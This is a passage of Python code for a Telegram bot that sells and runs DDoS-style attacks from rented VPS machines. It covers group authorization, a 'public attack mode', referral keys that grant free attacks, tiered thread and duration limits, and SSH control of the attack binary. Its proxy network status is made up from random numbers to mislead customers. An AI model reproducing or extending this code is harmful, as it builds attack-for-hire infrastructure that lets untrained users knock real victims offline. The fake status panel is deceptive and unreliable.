        if group_id in ALLOWED_GROUP_IDS:
            bot.reply_to(message,
                "╭━━━〔 ⚠️ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗔𝗗𝗗𝗘𝗗 〕━━━╮\n"
                "│\n"
                "│ This group is already\n"
                "│ in the authorized list!\n"
                "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
                reply_markup=create_main_keyboard(message))
            return
            
        # Try to get group info to verify
        try:
            chat = bot.get_chat(group_id)
            group_name = chat.title
        except Exception as e:
            group_name = "Unknown Group"
            print(f"Couldn't fetch group info: {e}")
        
        ALLOWED_GROUP_IDS.append(group_id)
        save_data()
        
        bot.reply_to(message,
            f"╭━━━〔 ✅ 𝗚𝗥𝗢𝗨𝗣 𝗔𝗗𝗗𝗘𝗗 〕━━━╮\n"
            f"│\n"
            f"│ Group: {group_name}\n"
            f"│ ID: `{group_id}`\n"
            f"│\n"
            f"│ Now authorized to use\n"
            f"│ bot commands!\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))
            
    except ValueError:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗜𝗗 〕━━━╮\n"
            "│\n"
            "│ Please enter a valid\n"
            "│ negative group ID!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
    except Exception as e:
        bot.reply_to(message,
            f"╭━━━〔 ❌ 𝗘𝗥𝗥𝗢𝗥 〕━━━╮\n"
            f"│\n"
            f"│ Failed to add group:\n"
            f"│ {str(e)}\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))

@bot.message_handler(func=lambda msg: msg.text == "👥 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋")
def remove_group_handler(message):
    """Remove an allowed group with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can remove\n"
            "│ authorized groups!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    if not ALLOWED_GROUP_IDS:
        bot.reply_to(message,
            "╭━━━〔 ⚠️ 𝗡𝗢 𝗚𝗥𝗢𝗨𝗣𝗦 〕━━━╮\n"
            "│\n"
            "│ No groups in the\n"
            "│ authorized list!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🗑 {chat.title}"))
        except:
            markup.add(telebot.types.KeyboardButton(f"🗑 Unknown Group ({group_id})"))
    
    markup.add(telebot.types.KeyboardButton("❌ Cancel"))
    
    bot.reply_to(message,
        "╭━━━〔 🏰 𝗥𝗘𝗠𝗢𝗩𝗘 𝗚𝗥𝗢𝗨𝗣 〕━━━╮\n"
        "│\n"
        "│ Select group to remove:\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        reply_markup=markup)
    bot.register_next_step_handler(message, process_remove_group)

def process_remove_group(message):
    """Process group removal with premium styling"""
    if message.text == "❌ Cancel":
        bot.reply_to(message,
            "╭━━━〔 🚫 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Group removal cancelled\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 🗑 prefix
    
    # Find which group was selected
    selected_group = None
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            if f"Unknown Group ({group_id})" == selected_title:
                selected_group = group_id
                break
    
    if selected_group:
        ALLOWED_GROUP_IDS.remove(selected_group)
        save_data()
        
        bot.reply_to(message,
            f"╭━━━〔 ✅ 𝗚𝗥𝗢𝗨𝗣 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 〕━━━╮\n"
            f"│\n"
            f"│ Group: {selected_title}\n"
            f"│\n"
            f"│ No longer authorized to\n"
            f"│ use bot commands!\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
    else:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 〕━━━╮\n"
            "│\n"
            "│ Selected group not in\n"
            "│ authorized list!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))


@bot.message_handler(func=lambda msg: msg.text == "🌐 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾")
def activate_public(message):
    """Activate public attack mode for a group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲!")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        if group_id in PUBLIC_GROUPS:  # Skip already public groups
            continue
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🌐 {chat.title}"))
        except:
            continue
    
    if len(markup.keyboard) == 0:  # No groups available
        bot.reply_to(message, "⚠️ 𝗔𝗹𝗹 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗴𝗿𝗼𝘂𝗽𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗮𝗰𝘁𝗶𝘃𝗲!", reply_markup=create_main_keyboard(message))
        return
    
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    bot.reply_to(message, "🛠️ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 (𝟭𝟮𝟬𝘀 𝗹𝗶𝗺𝗶𝘁, 𝟭 𝗩𝗣𝗦):", reply_markup=markup)
    bot.register_next_step_handler(message, process_public_group_selection)

def process_public_group_selection(message):
    """Process group selection for public mode with premium styling"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "🚫 𝗣𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 🌐 prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        bot.reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return
    
    # Add the selected group to public groups list
    if selected_group not in PUBLIC_GROUPS:
        PUBLIC_GROUPS.append(selected_group)
    
    bot.reply_to(message, 
        f"""
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 〕━━━╮
┃
┣ 🔹 𝗚𝗿𝗼𝘂𝗽: {selected_title}
┣ ⏱ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
┣ 🧵 𝗠𝗮𝘁𝘁𝗮𝗰𝗸𝘀: 𝟭𝟬𝟬
┣ 🔓 𝗡𝗼 𝗸𝗲𝘆 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
""", 
        reply_markup=create_main_keyboard(message))
    
    # Send announcement to the selected group
    try:
        bot.send_message(
            selected_group,
            """
╭━━━〔 🌐 𝗣𝗨𝗕𝗟𝗜𝗖 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 〕━━━╮
┃
┣ 🔥 𝗔𝗻𝘆𝗼𝗻𝗲 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!
┃
┣ ⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
┣ ⏱ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀
┣ 🧵 𝗠𝗮𝘅 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 𝟭8𝟬𝟬
┣ 🔓 𝗡𝗼 𝗸𝗲𝘆 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱
┃
┣ 💡 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗮𝘀 𝘂𝘀𝘂𝗮𝗹!
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
        )
    except Exception as e:
        print(f"[ERROR] Could not send public mode announcement: {e}")

@bot.message_handler(func=lambda msg: msg.text == "❌ 𝘿𝙀𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾")
def deactivate_public_start(message):
    """Start deactivation of public attack mode with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ Only owner can deactivate public mode!")
        return

    if not PUBLIC_GROUPS:
        bot.reply_to(message, "ℹ️ Public mode is not active on any group.")
        return

    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"❌ {chat.title}"))
        except:
            markup.add(telebot.types.KeyboardButton(f"❌ Unknown Group ({group_id})"))

    markup.add(telebot.types.KeyboardButton("❌ Cancel"))

    bot.reply_to(message, "Select group(s) to deactivate public mode:", reply_markup=markup)
    bot.register_next_step_handler(message, process_deactivate_public_selection)

def process_deactivate_public_selection(message):
    """Process deactivation of public mode with premium styling"""
    if message.text == "❌ Cancel":
        bot.reply_to(message, "❌ Deactivation cancelled.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:]  # remove ❌ emoji

    # Find which group was selected
    selected_group = None
    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            if f"Unknown Group ({group_id})" == selected_title:
                selected_group = group_id
                break

    if selected_group:
        PUBLIC_GROUPS.remove(selected_group)
        try:
            bot.send_message(selected_group, "❌ PUBLIC ATTACK MODE HAS BEEN DEACTIVATED.")
        except:
            pass
        bot.reply_to(message, f"✅ Public mode deactivated for {selected_title}.", reply_markup=create_main_keyboard(message))
    else:
        bot.reply_to(message, "❌ Selected group not found in public groups list.", reply_markup=create_main_keyboard(message))
        

# ======================
# 🎁 REFERRAL SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🎁 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟")
def generate_referral(message):
    """Generate referral link for user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Check if user already has a referral code
    if user_id in REFERRAL_CODES:
        code = REFERRAL_CODES[user_id]
    else:
        # Generate new referral code
        code = f"Alonepapa-{user_id[:4]}-{os.urandom(2).hex().upper()}"
        REFERRAL_CODES[user_id] = code
        save_data()
    
    # Create referral link
    referral_link = f"https://t.me/{bot.get_me().username}?start={code}"
    
    response = f"""
🌟 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗣𝗥𝗢𝗚𝗥𝗔𝗠 🌟

🔗 𝗬𝗼𝘂𝗿 𝗿𝗲𝗳𝗲𝗿𝗿𝗮𝗹 𝗹𝗶𝗻𝗸:
{referral_link}

𝗛𝗼𝘄 𝗶𝘁 𝘄𝗼𝗿𝗸𝘀:
1. Share this link with friends
2. When they join using your link
3. 𝗕𝗢𝗧𝗛 𝗼𝗳 𝘆𝗼𝘂 𝗴𝗲𝘁 𝗮 𝗳𝗿𝗲𝗲 {REFERRAL_REWARD_DURATION}𝘀 𝗮𝘁𝘁𝗮𝗰𝗸!
   (Valid for 10 minutes only)

💎 𝗧𝗵𝗲 𝗺𝗼𝗿𝗲 𝘆𝗼𝘂 𝘀𝗵𝗮𝗿𝗲, 𝘁𝗵𝗲 𝗺𝗼𝗿𝗲 𝘆𝗼𝘂 𝗲𝗮𝗿𝗻!
"""
    bot.reply_to(message, response)

def handle_referral(message, referral_code):
    """Process referral code usage with premium styling"""
    new_user_id = str(message.from_user.id)
    
    # Check if this user already exists in the system
    if new_user_id in redeemed_users or new_user_id in REFERRAL_LINKS:
        return  # Existing user, don't generate new keys
    
    # Check if this is a valid referral code
    referrer_id = None
    for uid, code in REFERRAL_CODES.items():
        if code == referral_code:
            referrer_id = uid
            break
    
    if referrer_id:
        # Store that this new user came from this referrer
        REFERRAL_LINKS[new_user_id] = referrer_id
        
        # Generate free attack keys for both users (valid for 10 minutes)
        expiry_time = time.time() + 600  # 10 minutes in seconds
        
        # For referrer
        referrer_key = f"REF-{referrer_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[referrer_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        # For new user
        new_user_key = f"REF-{new_user_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[new_user_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        save_data()
        
        # Notify both users
        try:
            # Message to referrer
            bot.send_message(
                referrer_id,
                f"🎉 𝗡𝗘𝗪 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟!\n"
                f"👤 {get_display_name(message.from_user)} used your referral link\n"
                f"🔑 𝗬𝗼𝘂𝗿 𝗿𝗲𝘄𝗮𝗿𝗱 𝗸𝗲𝘆: {referrer_key}\n"
                f"⏱ {REFERRAL_REWARD_DURATION}𝘀 𝗳𝗿𝗲𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 (Valid for 10 minutes)"
            )
            
            # Message to new user
            bot.send_message(
                message.chat.id,
                f"🎁 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗕𝗢𝗡𝗨𝗦!\n"
                f"🔑 𝗬𝗼𝘂𝗿 𝗿𝗲𝘄𝗮𝗿𝗱 𝗸𝗲𝘆: {new_user_key}\n"
                f"⏱ {REFERRAL_REWARD_DURATION}𝘀 𝗳𝗿𝗲𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 (Valid for 10 minutes)\n\n"
                f"𝗨𝘀𝗲 redeem key button to redeem your key!"
            )
        except Exception as e:
            print(f"Error sending referral notifications: {e}")

# ======================
# 🌐 PROXY STATUS (PREMIUM STYLISH VERSION)
# ======================

def get_proxy_status():
    """Generate an enhanced proxy status report with premium styling"""
    # Simulate proxy locations with realistic countries and flags
    proxy_locations = [
        {"country": "United States", "flag": "🇺🇸", "city": "New York", "provider": "Cloudflare"},
        {"country": "Germany", "flag": "🇩🇪", "city": "Frankfurt", "provider": "AWS"},
        {"country": "Japan", "flag": "🇯🇵", "city": "Tokyo", "provider": "Google Cloud"},
        {"country": "Singapore", "flag": "🇸🇬", "city": "Singapore", "provider": "Azure"},
        {"country": "Netherlands", "flag": "🇳🇱", "city": "Amsterdam", "provider": "DigitalOcean"},
        {"country": "United Kingdom", "flag": "🇬🇧", "city": "London", "provider": "Linode"},
        {"country": "Canada", "flag": "🇨🇦", "city": "Toronto", "provider": "Vultr"},
        {"country": "France", "flag": "🇫🇷", "city": "Paris", "provider": "OVH"},
    ]
    
    # Generate random but realistic proxy statuses
    proxy_statuses = []
    for proxy in proxy_locations:
        status = random.choices(
            ["🟢 ONLINE", "🟡 BUSY", "🔴 OFFLINE"],
            weights=[0.7, 0.2, 0.1],
            k=1
        )[0]
        
        ping = random.randint(5, 150) if status != "🔴 OFFLINE" else "---"
        speed = f"{random.randint(10, 100)} MB/s" if status == "🟢 ONLINE" else "---"
        load = f"{random.randint(0, 100)}%" if status != "🔴 OFFLINE" else "---"
        
        proxy_statuses.append({
            **proxy,
            "status": status,
            "ping": ping,
            "speed": speed,
            "load": load,
            "uptime": f"{random.randint(95, 100)}.%"
        })

    # Sort by status (online first)
    proxy_statuses.sort(key=lambda x: 0 if x["status"] == "🟢 ONLINE" else 1 if x["status"] == "🟡 BUSY" else 2)

    # Create the status table
    table_header = (
        "╭───────────┬──────────────┬──────────┬──────────┬──────────┬──────────┬──────────────╮\n"
        "│ Location  │    Status    │   Ping   │  Speed   │   Load   │  Uptime  │  Provider    │\n"
        "├───────────┼──────────────┼──────────┼──────────┼──────────┼──────────┼──────────────┤"
    )
    
    table_rows = []
    for proxy in proxy_statuses:
        row = (
            f"│ {proxy['flag']} {proxy['city'][:9]:<9} │ "
            f"{proxy['status']:<12} │ "
            f"{str(proxy['ping'])+'ms':<8} │ "
            f"{proxy['speed']:<8} │ "
            f"{proxy['load']:<8} │ "
            f"{proxy['uptime']:<8} │ "
            f"{proxy['provider'][:12]:<12} │"
        )
        table_rows.append(row)

    table_footer = "╰───────────┴──────────────┴──────────┴──────────┴──────────┴──────────┴──────────────╯"

    # Calculate summary statistics
    online_count = sum(1 for p in proxy_statuses if p["status"] == "🟢 ONLINE")
    total_count = len(proxy_statuses)
    health_percentage = int((online_count / total_count) * 100)

    # Create health bar
    bars = "█" * int(health_percentage / 10)
    spaces = " " * (10 - len(bars))
    health_bar = f"[{bars}{spaces}] {health_percentage}%"

    # Build the final message
    status_report = (
        f"╭━━━━━━━━━━━━━━━━━━━━━━━━━✦ 𝙋𝙍𝙊𝙓𝙔 𝙉𝙀𝙏𝙒𝙊𝙍𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 ✦━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
        f"│\n"
        f"│  🔍 𝙇𝙖𝙨𝙩 𝙎𝙘𝙖𝙣: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"│  📊 𝙃𝙚𝙖𝙡𝙩𝙝: {health_bar}\n"
        f"│  🟢 𝙊𝙣𝙡𝙞𝙣𝙚: {online_count}/{total_count}  🟡 𝘽𝙪𝙨𝙮: {sum(1 for p in proxy_statuses if p['status'] == '🟡 BUSY')}  🔴 𝙊𝙛𝙛𝙡𝙞𝙣𝙚: {sum(1 for p in proxy_statuses if p['status'] == '🔴 OFFLINE')}\n"
        f"│\n"
        f"{table_header}\n"
        f"{chr(10).join(table_rows)}\n"
        f"{table_footer}\n"
        f"│\n"
        f"│  📌 𝙇𝙚𝙜𝙚𝙣𝙙:  🟢 Excellent  🟡 Moderate  🔴 Maintenance\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

    return status_report

@bot.message_handler(func=lambda msg: msg.text == "🍅 𝙋𝙍𝙊𝙓𝙔 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_proxy_status(message):
    """Display the enhanced proxy status with loading animation"""
    # Send initial loading message
    msg = bot.send_message(
        message.chat.id,
        "╭━━━━━━━━━━━━━━━━━━━━━━━━━✦ 𝙎𝘾𝘼𝙉𝙉𝙄𝙉𝙂 ✦━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "│\n"
        "│  🔍 Scanning global proxy network...\n"
        "│  🛰 Connecting to 8 worldwide locations\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

    # Create loading animation
    for i in range(3):
        try:
            dots = "." * (i + 1)
            bot.edit_message_text(
                f"╭━━━━━━━━━━━━━━━━━━━━━━━━━✦ 𝙎𝘾𝘼𝙉𝙉𝙄𝙉𝙂 ✦━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
                f"│\n"
                f"│  🔍 Scanning global proxy network{dots}\n"
                f"│  🛰 Connecting to 8 worldwide locations\n"
                f"│\n"
                f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
                message.chat.id,
                msg.message_id
            )
            time.sleep(0.5)
        except:
            pass

    # Get and send the status report
    status_report = get_proxy_status()
    
    try:
        bot.edit_message_text(
            status_report,
            message.chat.id,
            msg.message_id,
            parse_mode="Markdown"
        )
    except:
        # If message is too long, send as separate messages
        parts = [status_report[i:i+4000] for i in range(0, len(status_report), 4000)]
        for part in parts:
            bot.send_message(
                message.chat.id,
                part,
                parse_mode="Markdown"
            )
        
# Add this handler to your bot (place it with other message handlers)
@bot.message_handler(func=lambda msg: msg.text == "🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆")
def stop_user_attack(message):
    """Stop all running attacks for the current user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Find all running attacks by this user
    user_attacks = [aid for aid, details in running_attacks.items() if details['user_id'] == user_id]
    
    if not user_attacks:
        bot.reply_to(message, "⚠️ 𝗡𝗼 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝘀𝘁𝗼𝗽.")
        return
    
    # Try to stop each attack
    stopped_count = 0
    for attack_id in user_attacks:
        attack_details = running_attacks.get(attack_id)
        if attack_details:
            try:
                # Get VPS details
                vps_ip = attack_details['vps_ip']
                vps = next((v for v in VPS_LIST if v[0] == vps_ip), None)
                
                if vps:
                    ip, username, password = vps
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=10)
                    
                    # Kill the attack process
                    ssh.exec_command(f"pkill -f {BINARY_NAME}")
                    ssh.close()
                    stopped_count += 1
            except Exception as e:
                print(f"Error stopping attack: {e}")
            finally:
                # Remove from running attacks
                running_attacks.pop(attack_id, None)
    
    if stopped_count > 0:
        bot.reply_to(message, f"✅ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱 {stopped_count} 𝗮𝘁𝘁𝗮𝗰𝗸{'𝘀' if stopped_count > 1 else ''}!")
    else:
        bot.reply_to(message, "⚠️ 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝘀𝘁𝗼𝗽 𝗮𝗻𝘆 𝗮𝘁𝘁𝗮𝗰𝗸𝘀.")

# Add this function in the HELPER FUNCTIONS section
def get_vps_health(ip, username, password):
    """Get VPS health with raw metrics and percentage"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        
        health_data = {
            'cpu': None,
            'memory': None,
            'disk': None,
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }
        
        # 1. Check CPU usage
        stdin, stdout, stderr = ssh.exec_command("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'")
        cpu_usage = float(stdout.read().decode().strip())
        health_data['cpu'] = f"{cpu_usage:.1f}%"
        
        # 2. Check memory usage
        stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f\", $3*100/$2 }'")
        mem_usage = float(stdout.read().decode().strip())
        health_data['memory'] = f"{mem_usage:.1f}%"
        
        # 3. Check disk usage
        stdin, stdout, stderr = ssh.exec_command("df -h | awk '$NF==\"/\"{printf \"%s\", $5}'")
        disk_usage = stdout.read().decode().strip()
        health_data['disk'] = disk_usage
        
        # 4. Check binary exists
        stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/freeroot/root/{BINARY_NAME} 2>/dev/null || echo 'Not found'")
        binary_exists = "Not found" not in stdout.read().decode()
        health_data['binary_exists'] = binary_exists
        
        # 5. Check binary executable
        stdin, stdout, stderr = ssh.exec_command(f"test -x /home/master/freeroot/root/{BINARY_NAME} && echo 'Executable' || echo 'Not executable'")
        binary_executable = "Executable" in stdout.read().decode()
        health_data['binary_executable'] = binary_executable
        
        # 6. Check network connectivity
        stdin, stdout, stderr = ssh.exec_command("ping -c 1 google.com >/dev/null 2>&1 && echo 'Online' || echo 'Offline'")
        network_ok = "Online" in stdout.read().decode()
        health_data['network'] = network_ok
        
        ssh.close()
        
        # Calculate health percentage
        health_score = 0
        max_score = 6  # Total possible points
        
        if cpu_usage < 80: health_score += 1
        if mem_usage < 80: health_score += 1
        if int(disk_usage.strip('%')) < 80: health_score += 1
        if binary_exists: health_score += 1
        if binary_executable: health_score += 1
        if network_ok: health_score += 1
        
        health_data['health_percent'] = int((health_score / max_score) * 100)
        
        return health_data
        
    except Exception as e:
        print(f"Error checking VPS health for {ip}: {e}")
        return {
            'cpu': "Error",
            'memory': "Error",
            'disk': "Error",
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }

            
@bot.message_handler(func=lambda msg: msg.text == "⚙️ 𝙏𝙃𝙍𝙀𝘼𝘿 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎")
def thread_settings_menu(message):
    """Handle thread settings menu access"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only owner can access thread settings!")
        return
    bot.send_message(
        message.chat.id,
        "⚙️ Thread Settings Management Panel",
        reply_markup=create_thread_settings_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "🧵 SET NORMAL THREADS")
def set_normal_threads(message):
    """Ask admin for new max thread count for normal users"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only the owner can set normal thread count!")
        return
    
    bot.reply_to(message, "🧵 Please enter the new MAX THREADS for normal users:")
    bot.register_next_step_handler(message, process_normal_threads)

def process_normal_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 5000:
            raise ValueError("Thread count out of range.")
        global MAX_THREADS
        MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"✅ Normal MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "❌ Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "⚡ SET SPECIAL THREADS")
def set_special_threads(message):
    """Ask admin for new max thread count for special keys"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only the owner can set special thread count!")
        return

    bot.reply_to(message, "⚡ Enter new MAX THREADS for SPECIAL key users:")
    bot.register_next_step_handler(message, process_special_threads)

def process_special_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 5000:
            raise ValueError("Thread count out of range.")
        global SPECIAL_MAX_THREADS
        SPECIAL_MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"✅ Special MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "❌ Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "💎 SET VIP THREADS")
def set_vip_threads(message):
    """Ask admin for new max thread count for VIP users"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only the owner can set VIP thread count!")
        return

    bot.reply_to(message, "💎 Enter new MAX THREADS for VIP users:")
    bot.register_next_step_handler(message, process_vip_threads)

def process_vip_threads(message):
    try:
        new_value = int(message.text)
        if new_value < 1 or new_value > 10000:
            raise ValueError("Thread count out of safe range.")
        global VIP_MAX_THREADS
        VIP_MAX_THREADS = new_value
        save_data()
        bot.reply_to(message, f"✅ VIP MAX THREADS updated to: {new_value}")
    except:
        bot.reply_to(message, "❌ Invalid input! Please enter a number.")


@bot.message_handler(func=lambda msg: msg.text == "📊 VIEW THREAD SETTINGS")
def view_thread_settings(message):
    """Show current thread settings"""
    response = f"""
⚙️ *Current Thread Settings*:

• 🧵 Normal Threads: `{MAX_THREADS}`
• ⚡ Special Threads: `{SPECIAL_MAX_THREADS}` 
• 💎 VIP Threads: `{VIP_MAX_THREADS}`

*Attack Durations:*
• Normal: `{MAX_DURATION}s`
• Special: `{SPECIAL_MAX_DURATION}s`
• VIP: `{VIP_MAX_DURATION}s`
"""
    bot.reply_to(message, response, parse_mode="Markdown")            


# ======================
# 👥 USER MANAGEMENT SYSTEM (STYLISH VERSION)
# ======================

@bot.message_handler(func=lambda msg: msg.text == "😅 𝗔𝗟𝗟 𝙐𝙎𝙀𝙍𝙎")
def show_all_users(message):
    """Show all users with pagination and search"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
